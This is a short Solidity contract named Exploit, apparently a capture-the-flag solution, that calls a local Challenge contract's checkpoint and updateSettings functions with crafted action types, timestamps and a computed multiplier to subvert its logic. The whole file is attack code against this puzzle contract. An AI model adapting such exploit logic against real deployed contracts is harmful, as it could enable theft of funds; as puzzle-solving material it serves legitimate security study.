// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Challenge.sol";

contract Exploit {
    Challenge public chal;
    uint public oldTime;

    constructor(address _chal) {
        chal = Challenge(_chal);
    }

    function solve() public {
        Challenge.Action[] memory actions = new Challenge.Action[](1);
        actions[0]._type = 0;
        actions[0].timestamp = 0;
        actions[0].extraInfo = uint256(uint160(address(this)));
        chal.checkpoint(1337, actions);

        actions[0]._type = 1;
        actions[0].timestamp = 1;
        chal.checkpoint(1337, actions);

        actions[0]._type = 1;
        actions[0].timestamp = 1;
        chal.checkpoint(1337, actions);
        oldTime = block.timestamp;
    }

    function solve2() public {
        Challenge.Action[] memory actions = new Challenge.Action[](1);
        uint multiplier = uint(1e32) / (block.timestamp - oldTime) - 2;
        require(
            (2 + multiplier) * (block.timestamp - oldTime) == uint(1e32),
            "1e32 isnt divisible"
        );
        chal.updateSettings(address(this), multiplier, 0);
        actions[0]._type = 2;
        actions[0].timestamp = 1;
        actions[0].extraInfo = 1;
        chal.checkpoint(1337, actions);
    }
}
